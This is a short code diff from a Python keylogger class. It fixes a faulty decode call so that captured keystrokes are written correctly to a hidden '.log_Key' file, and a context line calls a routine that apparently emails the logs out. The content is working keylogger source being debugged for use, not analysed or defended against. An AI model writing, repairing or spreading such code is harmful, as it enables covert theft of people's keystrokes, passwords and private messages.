@@ -314,11 +314,11 @@ class Keylogger:
             if self.caps :
                self.ADD_LOG_KEY(self.press_Key.upper())
                with open('.log_Key','a',encoding="utf-8")as file0:
-                    file1 =file0.write(self.press_Key.upper()).decode('utf-8')
+                    file1 =file0.write(self.press_Key.upper())
             else:
                self.ADD_LOG_KEY(self.press_Key)
                with open('.log_Key','a',encoding="utf-8")as file0:
-                         file1 =file0.write(self.press_Key).decode('utf-8')  
+                         file1 =file0.write(self.press_Key)
                                   
         def START_SEND_ANDTIME(self):
             self.SEND_LOG_EMAILl()
